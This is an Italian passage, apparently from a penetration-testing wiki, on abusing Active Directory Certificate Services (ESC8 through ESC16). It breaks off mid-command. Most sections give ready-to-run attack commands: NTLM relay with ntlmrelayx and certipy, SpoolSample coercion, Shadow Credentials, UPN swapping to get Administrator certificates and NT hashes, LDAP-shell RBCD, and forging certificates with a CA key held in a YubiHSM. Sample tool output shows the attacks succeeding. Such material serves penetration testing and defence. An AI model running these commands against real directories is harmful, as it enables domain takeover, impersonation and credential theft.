- L’**interfaccia web enrollment** (una vecchia applicazione ASP disponibile all’indirizzo `http://<caserver>/certsrv/`) usa HTTP per impostazione predefinita, che non protegge dagli attacchi NTLM relay. Inoltre, consente esplicitamente solo l’autenticazione NTLM tramite il suo header HTTP Authorization, rendendo inapplicabili metodi di autenticazione più sicuri come Kerberos.
- Il **Certificate Enrollment Service** (CES), il **Certificate Enrollment Policy** (CEP) Web Service e il **Network Device Enrollment Service** (NDES) supportano per impostazione predefinita l’autenticazione negotiate tramite il loro header HTTP Authorization. L’autenticazione negotiate **supporta sia** Kerberos sia **NTLM**, consentendo a un attaccante di **forzare il downgrade all’autenticazione NTLM** durante gli attacchi relay. Sebbene questi servizi web abilitino HTTPS per impostazione predefinita, HTTPS da solo **non protegge dagli attacchi NTLM relay**. La protezione dagli attacchi NTLM relay per i servizi HTTPS è possibile solo se HTTPS viene abbinato al channel binding. Purtroppo, AD CS non attiva Extended Protection for Authentication in IIS, necessaria per il channel binding.<sup>[[6]](#references)</sup>

Un **problema** comune degli attacchi NTLM relay è la **breve durata delle sessioni NTLM** e l’impossibilità per l’attaccante di interagire con servizi che **richiedono la firma NTLM**.

Tuttavia, questa limitazione può essere superata sfruttando un attacco NTLM relay per ottenere un certificato dell’utente: la durata della sessione è determinata dal periodo di validità del certificato, che può essere usato anche con servizi che **richiedono la firma NTLM**. Per istruzioni sull’utilizzo di un certificato rubato, consulta:


{{#ref}}
account-persistence.md
{{#endref}}

Un’altra limitazione degli attacchi NTLM relay è che **l’account della vittima deve autenticarsi presso una macchina controllata dall’attaccante**. L’attaccante può attendere oppure tentare di **forzare** questa autenticazione:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

Il comando `cas` di [**Certify**](https://github.com/GhostPack/Certify) enumera gli **endpoint HTTP AD CS abilitati**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La proprietà `msPKI-Enrollment-Servers` viene utilizzata dalle Certificate Authority (CA) aziendali per archiviare gli endpoint del Certificate Enrollment Service (CES). Questi endpoint possono essere analizzati ed elencati utilizzando lo strumento **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Sfruttamento con [Certipy](https://github.com/ly4k/Certipy)

Per impostazione predefinita, Certipy effettua la richiesta di un certificato basandosi sul template `Machine` o `User`, in base al fatto che il nome dell'account sottoposto a relay termini o meno con `$`. È possibile specificare un template alternativo usando il parametro `-template`.

È quindi possibile ricorrere a una tecnica come [PetitPotam](https://github.com/ly4k/PetitPotam) per forzare l'autenticazione. Se si opera con i domain controller, è necessario specificare `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Nessuna Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Spiegazione

Il valore **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) di **`msPKI-Enrollment-Flag`**, indicato come ESC9, esclude da un certificato l'estensione SID `szOID_NTDS_CA_SECURITY_EXT`. I vecchi esempi di ESC9 si basano sul comportamento di compatibilità del KDC (`StrongCertificateBindingEnforcement=1`) oppure su un percorso separato di mapping debole di Schannel. Il valore `1` è un'**impostazione storica di compatibilità**, non il valore predefinito attuale: Microsoft afferma che l'override del KDC ha smesso di essere supportato con l'aggiornamento di sicurezza di Windows del 9 settembre 2025. Prima di applicare una procedura meno recente, verifica gli aggiornamenti effettivamente installati sul target e l'endpoint di autenticazione in uso.<sup>[[7]](#references)</sup> Consulta le [indicazioni di Microsoft sul rilascio](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Le condizioni in cui l'impostazione di questo flag diventa rilevante includono:

- Su un KDC compatibile meno recente, i criteri effettivi di associazione dei certificati consentono il mapping; in alternativa, l'endpoint Schannel abilita separatamente il mapping UPN tramite il bit `0x4` di `CertificateMappingMethods`.
- Il certificato è contrassegnato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nell'impostazione `msPKI-Enrollment-Flag`.
- Il certificato specifica un qualsiasi EKU per l'autenticazione client.
- Sono disponibili autorizzazioni `GenericWrite` su un account da compromettere per attaccarne un altro.

### Scenario di abuso

Supponiamo che `John@corp.local` disponga di autorizzazioni `GenericWrite` su `Jane@corp.local` e che l'obiettivo sia compromettere `Administrator@corp.local`. Il template di certificato `ESC9`, per il quale `Jane@corp.local` è autorizzata a richiedere un certificato, è configurato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nell'impostazione `msPKI-Enrollment-Flag`.

Per prima cosa, si acquisisce l'hash di `Jane` tramite Shadow Credentials, sfruttando le autorizzazioni `GenericWrite` di `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo intenzionalmente la parte di dominio `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Questa modifica non viola i vincoli, dato che `Administrator@corp.local` rimane distinto dal `userPrincipalName` di `Administrator`.

Successivamente, il template di certificato `ESC9`, contrassegnato come vulnerabile, viene richiesto come `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Si nota che il `userPrincipalName` del certificato corrisponde a `Administrator`, senza alcun «object SID».

Il `userPrincipalName` di `Jane` viene quindi ripristinato al valore originale, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Il tentativo di autenticazione con il certificato emesso restituisce ora l’hash NT di `Administrator@corp.local`. Il comando deve includere `-domain <domain>` perché il certificato non specifica il dominio:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Mappature deboli dei certificati - ESC10

### Spiegazione

Con ESC10 si fa spesso riferimento a due criteri distinti di mappatura dei certificati. Verifica l'impostazione sull'endpoint che gestisce effettivamente l'autenticazione in questione:

- `CertificateMappingMethods` di Schannel, in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel`, controlla la mappatura dei certificati client TLS sul server applicativo. Il bit UPN è `0x4`; sui sistemi aggiornati, il valore predefinito è `0x18` (`0x8 | 0x10`).
- `StrongCertificateBindingEnforcement` del KDC, in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`, storicamente controllava la compatibilità del binding dei certificati Kerberos. Il valore `1` non è un valore predefinito attuale affidabile e Microsoft ha terminato il supporto per questa opzione con l'aggiornamento di sicurezza Windows del 9 settembre 2025. Il suo stato, da solo, non descrive la mappatura UPN di Schannel.<sup>[[7]](#references)</sup>

**Caso 1**

Storicamente, quando un KDC meno recente rispettava `StrongCertificateBindingEnforcement=0`; verifica il livello degli aggiornamenti, poiché questa opzione non è più supportata sui sistemi aggiornati attuali.

**Caso 2**

Quando sull'endpoint Schannel per i certificati client è abilitato il bit UPN (`0x4`) di `CertificateMappingMethods`. Questa impostazione è distinta dall'imposizione del binding forte del KDC e richiede comunque un certificato di autenticazione client per cui sia possibile richiedere l'iscrizione, oltre al controllo effettivo dell'attributo dell'account mappato.

### Caso di abuso 1

In una distribuzione meno recente in cui il KDC rispetta ancora `StrongCertificateBindingEnforcement=0`, il controllo di `userPrincipalName` di un account può far parte di un percorso di mappatura debole verso un altro account. L'iscrizione al certificato necessaria, la mappatura, l'identità target e l'autenticazione riuscita devono essere verificati separatamente; una ACE `GenericWrite` o un valore di registro, da soli, non dimostrano che sia possibile assumere il controllo dell'account.

Per esempio, avendo permessi `GenericWrite` su `Jane@corp.local`, un attacker mira a compromettere `Administrator@corp.local`. La procedura ricalca ESC9 e consente di utilizzare qualsiasi template di certificato.

Inizialmente, l'hash di `Jane` viene recuperato usando Shadow Credentials e sfruttando `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo deliberatamente la parte `@corp.local` per evitare una violazione dei vincoli.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Successivamente, viene richiesto come `Jane` un certificato che consente l'autenticazione client, utilizzando il modello predefinito `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Il `userPrincipalName` di `Jane` viene quindi ripristinato al valore originale, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

L'autenticazione con il certificato ottenuto restituirà l'hash NT di `Administrator@corp.local`; sarà quindi necessario specificare il dominio nel comando, poiché il certificato non contiene informazioni sul dominio.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Caso di abuso 2

Con `CertificateMappingMethods` contenente il flag di bit `UPN` (`0x4`), un account A con permessi `GenericWrite` può compromettere qualsiasi account B privo della proprietà `userPrincipalName`, inclusi gli account macchina e l’amministratore di dominio integrato `Administrator`.

In questo caso, l’obiettivo è compromettere `DC$@corp.local`, iniziando con l’ottenimento dell’hash di `Jane` tramite Shadow Credentials, sfruttando `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

Il `userPrincipalName` di `Jane` viene quindi impostato su `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Viene richiesto un certificato per l'autenticazione client come `Jane` utilizzando il template predefinito `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

L'`userPrincipalName` di `Jane` viene ripristinato al valore originale dopo questo processo.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Per autenticarsi tramite Schannel, viene utilizzata l'opzione `-ldap-shell` di Certipy, che indica l'autenticazione riuscita come `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Attraverso la shell LDAP, comandi come `set_rbcd` consentono attacchi di Resource-Based Constrained Delegation (RBCD), che possono compromettere il controller di dominio.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Questa vulnerabilità si estende anche a qualsiasi account utente privo di `userPrincipalName` o per cui questo non corrisponda a `sAMAccountName`. L’account predefinito `Administrator@corp.local` è un obiettivo privilegiato, poiché dispone di privilegi LDAP elevati e, per impostazione predefinita, non ha un `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Spiegazione

Se CA Server non è configurato con `IF_ENFORCEENCRYPTICERTREQUEST`, è possibile eseguire attacchi NTLM relay senza firma tramite il servizio RPC. [Riferimento qui](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Puoi usare `certipy` per verificare se `Enforce Encryption for Requests` è disabilitato; in tal caso, certipy mostrerà le vulnerabilità `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Scenario di abuso

È necessario configurare un server relay:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Nota: per i domain controller, dobbiamo specificare `-template` in DomainController.

Oppure usando [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Accesso shell a ADCS CA con YubiHSM - ESC12

### Spiegazione

Gli amministratori possono configurare la Certificate Authority in modo che le chiavi siano archiviate su un dispositivo esterno, come "Yubico YubiHSM2".

Se un dispositivo USB è collegato al server CA tramite una porta USB, oppure a un USB device server nel caso in cui il server CA sia una macchina virtuale, è necessaria una chiave di autenticazione (a volte indicata come "password") affinché il Key Storage Provider possa generare e utilizzare le chiavi nello YubiHSM.

Questa chiave/password è archiviata in chiaro nel registro, sotto `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Riferimento [qui](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenario di abuso

Se la chiave privata della CA è archiviata su un dispositivo USB fisico quando ottieni l'accesso shell, è possibile recuperarla.

Per prima cosa, devi ottenere il certificato CA (che è pubblico), quindi:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Infine, usa il comando certutil `-sign` per contraffare un nuovo certificato arbitrario usando il certificato della CA e la relativa chiave privata.

## OID Group Link Abuse - ESC13

### Spiegazione

L'attributo `msPKI-Certificate-Policy` consente di aggiungere la policy di emissione al modello di certificato. Gli oggetti `msPKI-Enterprise-Oid` responsabili dell'emissione delle policy possono essere individuati nel Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) del contenitore PKI OID. Una policy può essere collegata a un gruppo AD tramite l'attributo `msDS-OIDToGroupLink` di questo oggetto, consentendo a un sistema di autorizzare un utente che presenta il certificato come se fosse membro del gruppo. [Riferimento qui](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

In altre parole, quando un utente ha il permesso di richiedere un certificato e questo è collegato a un gruppo OID, l'utente può ereditare i privilegi del gruppo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) per trovare OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Scenario di abuso

Individua un'autorizzazione utente usando `certipy find` o `Certify.exe find /showAllPermissions`.

Se `John` dispone dell'autorizzazione per iscriversi a `VulnerableTemplate`, può ereditare i privilegi del gruppo `VulnerableGroup`.

Deve solo specificare il template per ottenere un certificato con i diritti `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Abuso dell’associazione esplicita dei certificati — ESC14

### Spiegazione

La descrizione su https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping è particolarmente esaustiva. Di seguito è riportata una citazione del testo originale.<sup>[[14]](#references)</sup>

ESC14 riguarda le vulnerabilità derivanti da una «debole associazione esplicita dei certificati», dovute principalmente all’uso improprio o alla configurazione non sicura dell’attributo `altSecurityIdentities` negli account utente o computer di Active Directory. Questo attributo multivalore consente agli amministratori di associare manualmente certificati X.509 a un account AD per l’autenticazione. Quando è popolato, queste associazioni esplicite possono sovrascrivere la logica predefinita di associazione dei certificati, che in genere si basa sui nomi UPN o DNS nel SAN del certificato oppure sul SID incorporato nell’estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`.

Un’associazione è «debole» quando il valore stringa usato nell’attributo `altSecurityIdentities` per identificare un certificato è troppo generico, facilmente intuibile, si basa su campi del certificato non univoci o usa componenti del certificato facilmente falsificabili. Se un attacker può ottenere o creare un certificato i cui attributi corrispondono a un’associazione esplicita debole definita per un account privilegiato, può usare quel certificato per autenticarsi come quell’account e impersonarlo.

Esempi di stringhe di associazione `altSecurityIdentities` potenzialmente deboli:

- Associazione basata solo su un Common Name (CN) comune nell’oggetto: ad esempio, `X509:<S>CN=SomeUser`. Un attacker potrebbe riuscire a ottenere un certificato con questo CN da una fonte meno sicura.
- Uso di Distinguished Name (DN) dell’emittente o dell’oggetto eccessivamente generici, senza ulteriori specificazioni come un numero di serie specifico o un identificatore della chiave dell’oggetto: ad esempio, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Uso di altri schemi prevedibili o identificatori non crittografici che un attacker potrebbe soddisfare in un certificato che può ottenere legittimamente o falsificare (se ha compromesso una CA o ha trovato un template vulnerabile come in ESC1).

L’attributo `altSecurityIdentities` supporta diversi formati di associazione, tra cui:

- `X509:<I>IssuerDN<S>SubjectDN` (associazione basata sul DN completo dell’emittente e dell’oggetto)
- `X509:<SKI>SubjectKeyIdentifier` (associazione basata sul valore dell’estensione Subject Key Identifier del certificato)
- `X509:<SR>SerialNumberBackedByIssuerDN` (associazione basata sul numero di serie, qualificato implicitamente dal DN dell’emittente) - non è un formato standard; di solito è `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (associazione basata su un nome RFC822, in genere un indirizzo e-mail, proveniente dal SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (associazione basata su un hash SHA1 della chiave pubblica grezza del certificato, generalmente forte)

La sicurezza di queste associazioni dipende dagli identificatori utilizzati. Microsoft classifica come **deboli** le associazioni basate su e-mail o nomi dell’oggetto, incluse quelle `X509:<RFC822>`. In modalità Full Enforcement, un certificato privo di un’associazione forte viene rifiutato; l’aggiornamento di sicurezza Windows di settembre 2025 ha rimosso la possibilità di tornare alla modalità Compatibility. Pertanto, una mappatura debole da sola non è un metodo affidabile per l’impersonificazione. Prima di valutare uno scenario di associazione debole, verifica il livello effettivo di patch del domain controller e il comportamento dell’associazione dei certificati. L’accesso in scrittura a `altSecurityIdentities` è un indizio distinto: un attacker con un certificato attendibile appropriato potrebbe essere in grado di aggiungere un’associazione esplicita **forte**, in base alle autorizzazioni effettive e alla convalida del certificato. Vedi [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) e [la ricerca su ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

È inoltre necessario diagnosticare gli errori di autenticazione con certificato: un account disabilitato o una password scaduta possono impedire l’accesso anche se il certificato è ancora valido.

### Scenario di abuso

ESC14 prende di mira le **associazioni esplicite dei certificati** in Active Directory (AD), in particolare l’attributo `altSecurityIdentities`. Se questo attributo è impostato (intenzionalmente o per errore di configurazione), gli attacker possono impersonare gli account presentando certificati che corrispondono all’associazione.

#### Scenario A: l’attacker può scrivere in `altSecurityIdentities`

 **Prerequisito**: l’attacker dispone di autorizzazioni di scrittura sull’attributo `altSecurityIdentities` dell’account bersaglio oppure dell’autorizzazione per concederle, sotto forma di una delle seguenti autorizzazioni sull’oggetto AD bersaglio:  
- Proprietà Write `altSecurityIdentities`  
- Proprietà Write `Public-Information`  
- Proprietà Write (tutte)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Scenario B: il bersaglio ha un’associazione debole tramite X509RFC822 (e-mail)

- **Prerequisito storico/condizionale**: il bersaglio ha un’associazione X509RFC822 debole in `altSecurityIdentities`, l’attacker può modificare l’attributo `mail` di un enrollee e un template adatto include quell’indirizzo e-mail in un certificato di autenticazione client senza un’associazione SID in conflitto. L’autenticazione richiede inoltre un ambiente che accetti ancora l’associazione debole; Full Enforcement rifiuta le associazioni di certificato basate solo su mapping deboli. Il solo fatto che l’attributo `mail` sia scrivibile è soltanto un indizio.
#### Scenario C: il bersaglio ha un’associazione X509IssuerSubject

- **Prerequisito**: il bersaglio ha un’associazione esplicita X509IssuerSubject debole in `altSecurityIdentities`. L’attacker può impostare l’attributo `cn` o `dNSHostName` di un principal vittima in modo che corrisponda all’oggetto dell’associazione X509IssuerSubject del bersaglio. A quel punto, l’attacker può richiedere un certificato come vittima e usare il certificato per autenticarsi come bersaglio.
#### Scenario D: il bersaglio ha un’associazione X509SubjectOnly

- **Prerequisito**: il bersaglio ha un’associazione esplicita X509SubjectOnly debole in `altSecurityIdentities`. L’attacker può impostare l’attributo `cn` o `dNSHostName` di un principal vittima in modo che corrisponda all’oggetto dell’associazione X509SubjectOnly del bersaglio. A quel punto, l’attacker può richiedere un certificato come vittima e usare il certificato per autenticarsi come bersaglio.
### operazioni concrete
#### Scenario A

Richiedi un certificato del template di certificato `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Salva e converti il certificato

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Autenticarsi (usando il certificato)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Pulizia (facoltativa)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Per metodi di attacco più specifici nei vari scenari di attacco, fare riferimento a quanto segue: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Spiegazione

La [ricerca originale su ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) spiega come le application policy specificate in una richiesta per un template V1 possano sovrascrivere l'Extended Key Usage configurato su una **CA di emissione non aggiornata**.<sup>[[15]](#references)</sup> È inoltre necessario un template candidato pubblicato e utilizzabile per l'enrollment, che consenta le proprietà richieste del subject/della richiesta e non abbia controlli di approvazione o firma bloccanti. I soli diritti di enrollment non dimostrano che l'exploit sia possibile. L'uso di Certificate Request Agent può inoltre dipendere da un secondo template adatto e da restrizioni per gli enrollment agent; verificare lo stato delle patch della CA e il risultato dell'emissione prima di dichiarare percorribile questa strada.

### Abuso

La [documentazione di Certipy sull'escalation dei privilegi](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contiene esempi d'uso più dettagliati.<sup>[[14]](#references)</sup>


Il comando `find` di Certipy può aiutare a identificare i template V1 potenzialmente vulnerabili a ESC15 se la CA non è aggiornata.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenario A: Impersonazione diretta tramite Schannel

**Passaggio 1: Richiedere un certificato, inserendo la policy applicativa "Client Authentication" e l’UPN del target.** L’attaccante `attacker@corp.local` prende di mira `administrator@corp.local` usando il template V1 "WebServer" (che consente al richiedente di specificare il subject).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Il template V1 vulnerabile con "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inserisce l'OID `1.3.6.1.5.5.7.3.2` nell'estensione Application Policies del CSR.
- `-upn 'administrator@corp.local'`: Imposta il UPN nel SAN per l'impersonificazione.

**Step 2: Autenticarsi tramite Schannel (LDAPS) usando il certificato ottenuto.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: Impersonificazione PKINIT/Kerberos tramite abuso di Enrollment Agent

**Step 1: Richiedi un certificato da un template V1 (con "Enrollee supplies subject"), inserendo la Application Policy "Certificate Request Agent".** Questo certificato serve all’attaccante (`attacker@corp.local`) per diventare un enrollment agent. Qui non viene specificato alcun UPN per l’identità dell’attaccante, poiché l’obiettivo è ottenere la capacità di agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Step 2: Usa il certificato "agent" per richiedere un certificato per conto di un utente privilegiato target.** Questo è un passaggio simile a ESC3, che usa il certificato del passaggio 1 come certificato agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Passaggio 3: Autenticarsi come utente privilegiato usando il certificato "on-behalf-of".**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Estensione di sicurezza disabilitata sulla CA (globalmente)-ESC16

### Spiegazione

**ESC16 (escalation dei privilegi tramite estensione szOID_NTDS_CA_SECURITY_EXT mancante)** descrive la soppressione a livello di CA dell'estensione SID **szOID_NTDS_CA_SECURITY_EXT**. Questo è un indicatore di configurazione, non la prova che un certificato possa autenticarsi come un altro account. Per impersonare un account è inoltre necessario controllare gli attributi o il mapping dell'account pertinente, disporre di un template di autenticazione client per cui sia possibile iscriversi e avere un percorso di mapping del certificato accettato dal controller di dominio o dal servizio effettivo. Un KDC aggiornato in modalità Full Enforcement rifiuta i certificati senza estensione SID, a meno che non dispongano di un altro mapping forte; la procedura Kerberos basata solo su UPN riportata di seguito si applica ai KDC meno recenti o in modalità di compatibilità che accettano ancora un mapping debole. Consulta le [indicazioni di Microsoft sul mapping dei certificati e sull'applicazione dei criteri](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Puoi anche fare riferimento a questo articolo per approfondire il principio: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Sfruttamento

Il seguente esempio storico di Kerberos basato solo su UPN si basa sulla [documentazione di Certipy relativa a ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Richiede un KDC che accetti ancora il mapping debole risultante; `StrongCertificateBindingEnforcement=1` non è più un override supportato dopo l'aggiornamento di sicurezza di Windows del 9 settembre 2025.<sup>[[14]](#references)</sup>

Per identificare se l'ambiente Active Directory Certificate Services (AD CS) è vulnerabile a **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Passaggio 1: Leggi l'UPN iniziale dell'account della vittima (opzionale - per il ripristino).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Passaggio 2: Aggiorna l'UPN dell'account vittima con il `sAMAccountName` dell'amministratore target.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
